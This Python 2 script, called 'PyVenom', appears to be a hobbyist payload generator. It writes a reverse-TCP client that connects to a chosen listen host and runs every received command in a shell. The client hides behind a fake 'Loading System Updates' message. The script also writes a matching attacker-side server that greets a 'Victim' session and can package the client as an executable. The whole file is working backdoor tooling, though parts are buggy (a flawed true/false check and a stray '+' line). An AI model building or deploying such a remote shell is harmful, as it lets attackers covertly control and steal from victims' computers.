#!/usr/bin/env python2
#PyVenom V0.1 Unreleased
import argparse, time, os
def args():
    global args
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--payload', help='The Payload Type. Example: python/reverse_tcp')
    parser.add_argument('-x', '--executable', help="Make Payload an EXE File. Values: true, false.")
    parser.add_argument('-l', '--lhost', help="Listen Host")

    args = parser.parse_args()
def check_exe():
    if args.executable == "false" or "False":
        quit()
    if args.executable == "True" or "true":
        print "Creating exe.."
        time.sleep(1.5)
        os.system('pip install pyinstaller')
        name = raw_input("Name of the reverse tcp client file: ")
        os.system('pyinstaller ' + name)
    if args.executable == None:
        quit()
def check_values():
    if args.payload == "python/reverse_tcp":
        file = open('reverse_tcp_client.py', "w")
        file.write('''
import socket, subprocess
print "Loading System Updates! DO NOT EXIT THIS APPLICATION!" 
host = "''' + str(args.lhost) +
                   
'''"\nport = 51948
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
while True:
	data = s.recv(65536)
	if 'quit' in data:
		quit()
	else:
		CMD = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		s.sendall(CMD.stdout.read())
		s.sendall(CMD.stderr.read())


''')
    file2 = open("reverse_tcp_server.py", "w")
    file2.write('''
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ 
port = 51948
s.bind(("", port))
s.listen(50)
print "{+} TCP Server Started, waiting for client to connect..."
conn, addr = s.accept()
print "{*} Session Opened by Victim. PORT:",port
def command():
	while True:
		command = raw_input("[*] Session 1, Enter command: ")
		if 'quit' in command:
			conn.send('quit')
			conn.close()
			s.close()
			quit()
		else:
			conn.send(command)
			print conn.recv(65536)
			
command()
''')
    check_exe()
def banner():
    print('''
________________
|              |
|   PyVenom    | 
|              |
________________
''')
args()
check_values()
